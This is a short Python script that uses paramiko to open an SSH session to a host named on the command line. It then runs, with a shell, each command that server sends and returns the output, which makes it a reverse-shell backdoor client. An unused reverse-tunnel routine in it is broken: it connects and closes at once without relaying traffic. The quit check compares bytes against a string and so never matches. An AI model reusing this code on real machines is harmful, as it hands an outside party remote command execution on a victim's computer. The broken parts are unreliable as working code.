import sys
import paramiko
import threading
import socket
import subprocess

def tunnel_handler(channel, host, port):
    sock = socket.socket()

    try:
        sock.connect((host, port))
        print("Connected!")

        channel.close()
        sock.close()

    except Exception as e:
        print("Failed to establish tunnel!")


def establish_reverse_tunnel(forwardToHostPort, forwardFromPort, transport):
    """ Sets up a reverse tunnel, such that traffic on the server's port `forwardFromPort` is forwarded via SSH to `forwardToHostPort`
    """
    transport.request_port_forward("", forwardFromPort)
    closeTunnel = False

    while closeTunnel is not True:
        channel = transport.accept(1000)

        if channel is None:
            continue
        
        thread = threading.Thread(target=tunnel_handler, args=(channel, forwardToHostPort[0], forwardToHostPort[1]))
        thread.setDaemon(True)
        thread.start()

def receive_data(chan):
    # Receive and execute a command from the server
    command = chan.recv(1024)
    
    try:
        out = subprocess.check_output(command, shell=True)
        chan.send(out)
    except Exception as e:
        chan.send(str(e))
    finally:
        return command


def main():
    if len(sys.argv) < 5:
        print("Too few arguments!")

    else:
        hostname = sys.argv[1]
        username = sys.argv[2]
        password = sys.argv[3]
        port = sys.argv[4]
        localSSHDPort = 22
        remoteForwardPort = 9090

        try:
            client = paramiko.SSHClient()
            client.load_system_host_keys()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
            client.connect(hostname, port, username=username, password=password)
            chan = client.get_transport().open_session()
            command = ""

            print("Awaiting data")

            while command != "quit":
                try:
                    command = receive_data(chan)
                except KeyboardInterrupt:
                    command = "quit"    
        finally:
            client.close()

if __name__ == "__main__":
    main()

